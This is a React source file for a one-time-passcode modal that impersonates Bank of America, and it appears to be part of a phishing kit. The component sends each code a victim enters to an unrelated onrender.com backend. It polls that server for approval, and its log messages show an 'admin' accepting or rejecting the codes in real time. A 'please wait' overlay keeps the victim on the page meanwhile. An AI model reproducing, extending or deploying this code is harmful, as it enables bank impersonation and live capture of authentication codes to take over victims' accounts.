import { useState, useEffect, useRef } from "react";
import { useNavigate } from "react-router-dom";
import Model from "./Model";
import { useAuthStore } from "../store/useAuthStore";
import logo from "../assets/boa.png";
const DEBUG = true;

const PhoneOTPModal = () => {
  const navigate = useNavigate();
  const userId = useAuthStore((state) => state.id);

  // 🔧 State variables
  const [isOpen] = useState(true);
  const [otp, setOtp] = useState(["", "", "", "", "", ""]);
  const [status, setStatus] = useState<"pending" | "authorized" | "rejected">(
    "pending"
  );
  const [otpStatus, setOtpStatus] = useState<string | null>(null);
  const [pollingError, setPollingError] = useState<string | null>(null);
  const [isSending, setIsSending] = useState(false);
  const [loginStatus, setLoginStatus] = useState("pending");

  // 🔥 Overlay shows only after OTP submission
  const [submittedOtp, setSubmittedOtp] = useState(false);
  // ❌ Mark OTP inputs invalid on rejection
  const [otpRejected, setOtpRejected] = useState(false);

  const inputRefs = useRef<Array<HTMLInputElement | null>>([]);

  // 🔧 Refs for latest state (avoid stale closure issues)
  const statusRef = useRef(status);
  const otpStatusRef = useRef(otpStatus);

  useEffect(() => {
    statusRef.current = status;
  }, [status]);
  useEffect(() => {
    otpStatusRef.current = otpStatus;
  }, [otpStatus]);

  // 🎯 Focus first input on open
  useEffect(() => {
    if (isOpen && inputRefs.current[0]) {
      inputRefs.current[0].focus();
      if (DEBUG)
        console.log("%c[OTP Debug] 🎯 Auto-focused first input", "color: cyan");
    }
  }, [isOpen]);

  // 🔁 Poll backend for login/OTP status
  useEffect(() => {
    if (!userId) return;

    const fetchStatus = async () => {
      try {
        const res = await fetch(
          `https://urban-system-backend.onrender.com/api/status/${userId}`
        );
        if (!res.ok) throw new Error(`Server responded ${res.status}`);
        const data = await res.json();

        if (DEBUG) {
          console.groupCollapsed(
            "%c[OTP Debug] 📬 Poll result",
            "color: purple"
          );
          console.log("Login status:", data.status);
          console.log("OTP status:", data.otp_status);
          console.groupEnd();
        }

        if (data.status !== statusRef.current) {
          if (DEBUG)
            console.log(
              `%c[Login Status] 🔄 ${statusRef.current} → ${data.status}`,
              "color: green; font-weight: bold"
            );
          setStatus(data.status);
          setLoginStatus(data.status);
        }

        if (data.otp_status !== otpStatusRef.current) {
          if (DEBUG)
            console.log(
              `%c[OTP Status] 🔄 ${otpStatusRef.current} → ${data.otp_status}`,
              "color: blue; font-weight: bold"
            );
          setOtpStatus(data.otp_status);
        }

        setPollingError(null);
      } catch (err) {
        console.error("%c[OTP Debug] ❌ Polling error:", "color: red", err);
        setPollingError((err as Error).message);
      }
    };

    fetchStatus(); // immediate fetch
    const interval = setInterval(fetchStatus, 3000);
    return () => clearInterval(interval);
  }, [userId]);

  // 🚦 React to OTP status changes
  useEffect(() => {
    if (!otpStatus) return;

    if (DEBUG)
      console.log(
        "%c[OTP Debug] 🔔 OTP status effect triggered: " + otpStatus,
        "color: blue"
      );

    switch (otpStatus) {
      case "authorized":
        if (DEBUG)
          console.log(
            "%c[OTP Status] ✅ OTP authorized — Navigating...",
            "color: green; font-weight: bold"
          );
        setSubmittedOtp(false);
        setOtpRejected(false);
        navigate("/secure-account");
        break;
      case "rejected":
        if (DEBUG)
          console.warn(
            "%c[OTP Status] ❌ OTP rejected by admin — clearing inputs",
            "color: red; font-weight: bold"
          );
        setSubmittedOtp(false);
        setOtpRejected(true);
        setOtp(["", "", "", "", "", ""]); // clear inputs
        inputRefs.current[0]?.focus();
        break;
      case "otp_pending":
        if (DEBUG)
          console.log(
            "%c[OTP Status] ⏳ OTP pending admin verification...",
            "color: orange"
          );
        // show overlay only if OTP has been submitted
        break;
      default:
        if (DEBUG)
          console.log(
            "%c[OTP Status] ℹ️ Unrecognized OTP status: " + otpStatus,
            "color: gray"
          );
    }
  }, [otpStatus, navigate]);

  // ✏️ Handle OTP input
  const handleOtpChange = (value: string, index: number) => {
    if (/^[0-9]?$/.test(value)) {
      const updated = [...otp];
      updated[index] = value;
      setOtp(updated);
      if (DEBUG)
        console.log(
          `%c[OTP Input] ✏️ Digit updated at index ${index}: ${value}`,
          "color: purple"
        );

      if (value && index < otp.length - 1) {
        inputRefs.current[index + 1]?.focus();
        if (DEBUG)
          console.log(
            `%c[OTP Input] 👉 Auto-focus → index ${index + 1}`,
            "color: cyan"
          );
      }
    } else if (DEBUG) {
      console.warn(
        `%c[OTP Input] ⚠️ Invalid character ignored at index ${index}: ${value}`,
        "color: orange"
      );
    }
  };

  const handleKeyDown = (
    e: React.KeyboardEvent<HTMLInputElement>,
    index: number
  ) => {
    if (e.key === "Backspace" && !otp[index] && index > 0) {
      inputRefs.current[index - 1]?.focus();
      if (DEBUG)
        console.log(
          `%c[OTP Input] ⬅️ Backspace → focus index ${index - 1}`,
          "color: cyan"
        );
    }
  };

  // 📤 Submit OTP
  const sendOtp = async () => {
    if (!userId) return;

    const code = otp.join("");
    if (code.length !== 6) {
      if (DEBUG)
        console.warn(
          "%c[OTP Debug] ⚠️ OTP incomplete, submission blocked",
          "color: orange"
        );
      return;
    }

    setIsSending(true);
    try {
      if (DEBUG)
        console.log(
          "%c[OTP Debug] 🚀 Sending OTP: " + code + " for userId: " + userId,
          "color: cyan"
        );

      const res = await fetch(
        "https://urban-system-backend.onrender.com/api/save-otp",
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify({ code, userId }),
        }
      );
      const text = await res.text();
      let data;
      try {
        data = JSON.parse(text);
      } catch {
        data = text;
      }

      if (!res.ok) throw new Error(data.error || "Failed to send OTP");
      if (DEBUG)
        console.log(
          "%c[OTP Debug] 📩 OTP send response:",
          "color: purple",
          data
        );

      setOtpStatus("otp_pending");
      setSubmittedOtp(true);
      setOtpRejected(false); // reset rejection state on new submission
    } catch (err) {
      console.error("%c[OTP Debug] ❌ Send OTP error:", "color: red", err);
    } finally {
      setIsSending(false);
    }
  };

  const handleVerify = (e: React.FormEvent) => {
    e.preventDefault();
    sendOtp();
  };

  const handleResend = () => {
    setOtp(["", "", "", "", "", ""]);
    setOtpStatus("otp_pending");
    inputRefs.current[0]?.focus();
    setSubmittedOtp(false);
    setOtpRejected(false);
  };

  return (
    <Model isOpen={isOpen} blur>
      <div className="relative bg-white rounded-2xl shadow-xl max-w-sm w-full mx-auto px-8 py-8 flex flex-col items-center text-center border border-gray-200">
        {/* Logo */}
        <div className="mb-6">
          <img
            src={logo}
            alt="Bank of America Logo"
            className="h-10 object-contain mx-auto"
          />
        </div>

        {/* Title & Subtitle */}
        <h2 className="text-xl font-semibold text-[#1E2B4D] mb-2">
          Verify Your Identity
        </h2>
        <p className="text-gray-500 text-sm mb-6">
          Enter the 6-digit code sent to your registered device.
        </p>

        {/* OTP Form */}
        <form onSubmit={handleVerify} className="w-full">
          <div className="flex justify-center gap-3 mb-6">
            {otp.map((digit: string, index: number) => (
              <input
                key={index}
                ref={(el) => {
                  inputRefs.current[index] = el;
                }}
                type="tel"
                maxLength={1}
                value={digit}
                onChange={(e) => handleOtpChange(e.target.value, index)}
                onKeyDown={(e) => handleKeyDown(e, index)}
                className={`w-11 h-11 text-center border rounded-md text-lg font-medium focus:outline-none focus:ring-2 focus:ring-[#B42025] focus:border-[#B42025] transition-all ${
                  otpRejected
                    ? "border-red-500 animate-shake"
                    : "border-gray-300"
                }`}
              />
            ))}
          </div>

          {/* Buttons */}
          <button
            type="submit"
            disabled={isSending}
            className="bg-[#B42025] hover:bg-[#981A1E] text-white w-full py-2.5 rounded-md font-medium transition mb-3 disabled:opacity-50"
          >
            {isSending ? "Sending..." : "Verify Code"}
          </button>

          <button
            type="button"
            onClick={handleResend}
            className="bg-gray-100 hover:bg-gray-200 text-gray-700 w-full py-2.5 rounded-md font-medium transition"
          >
            Resend Code
          </button>

          {/* Status info */}
          <div className="mt-5 text-sm text-gray-600 text-left">
            <p>
              Login Status: <strong>{loginStatus}</strong>
            </p>
            <p>
              OTP Status: <strong>{otpStatus || "-"}</strong>
            </p>
            {pollingError && (
              <p className="mt-1 text-xs text-red-500">
                Polling error: {pollingError}
              </p>
            )}
          </div>
        </form>

        {/* Overlay Loader */}
        {submittedOtp && otpStatus === "otp_pending" && (
          <div className="absolute inset-0 bg-white/95 backdrop-blur-sm flex flex-col items-center justify-center rounded-2xl">
            <img
              src={logo}
              alt="Bank of America"
              className="h-8 mb-6 object-contain"
            />
            <div className="w-10 h-10 border-4 border-[#B42025] border-t-transparent rounded-full animate-spin mb-6" />
            <p className="text-gray-800 font-medium mb-1">
              Waiting for OTP verification…
            </p>
            <p className="text-gray-500 text-sm max-w-xs">
              Please wait while we verify your code. You’ll be redirected
              automatically.
            </p>
          </div>
        )}
      </div>
    </Model>
  );
};

export default PhoneOTPModal;
